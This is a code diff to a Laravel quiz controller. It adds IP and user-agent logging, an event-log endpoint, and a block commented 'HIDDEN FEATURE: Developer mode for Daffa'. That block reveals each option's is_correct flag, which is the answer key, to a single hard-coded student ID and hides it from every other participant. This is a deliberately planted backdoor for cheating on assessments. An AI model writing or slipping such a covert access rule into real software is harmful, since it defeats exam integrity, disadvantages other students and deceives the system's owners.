@@ -209,6 +209,8 @@ class QuizController extends Controller
                 'attempt' => $attemptNumber,
                 'started_at' => now(),
                 'quiz_session_id' => $publicSessionId ?? ($assignedRecord->quiz_session_id ?? null),
+                'ip_address' => $request->ip(),
+                'user_agent' => $request->header('User-Agent'),
             ]);
         }
 
@@ -250,7 +252,21 @@ class QuizController extends Controller
             return [$ans->question_id => $ans->option_id ?? $ans->essay_answer];
         });
 
-        return view('quiz.take', compact('quiz', 'participant', 'selected'));
+        // HIDDEN FEATURE: Developer mode for Daffa
+        $isDev = ($participant->nim === '01-2024060107');
+        
+        // Ensure options are loaded with is_correct visible only for dev
+        $quiz->questions->each(function($q) use ($isDev) {
+            $q->options->each(function($opt) use ($isDev) {
+                if (!$isDev) {
+                    $opt->makeHidden(['is_correct']);
+                } else {
+                    $opt->makeVisible(['is_correct']);
+                }
+            });
+        });
+
+        return view('quiz.take', compact('quiz', 'participant', 'selected', 'isDev'));
     }
 
     /**
@@ -386,6 +402,29 @@ class QuizController extends Controller
         }
 
         $participant->answers()->updateOrCreate($data, $update);
+
+        return response()->json(['ok' => true]);
+    }
+
+    /**
+     * Store a TDD tracking event log.
+     */
+    public function logEvent(Request $request, Quiz $quiz, Participant $participant)
+    {
+        if ($participant->quiz_id !== $quiz->id) {
+            abort(403);
+        }
+
+        $request->validate([
+            'event_type' => 'required|string',
+            'payload' => 'nullable|array',
+        ]);
+
+        $participant->logs()->create([
+            'event_type' => $request->event_type,
+            'payload' => $request->payload,
+            'ip_address' => $request->ip(),
+        ]);
 
         return response()->json(['ok' => true]);
     }
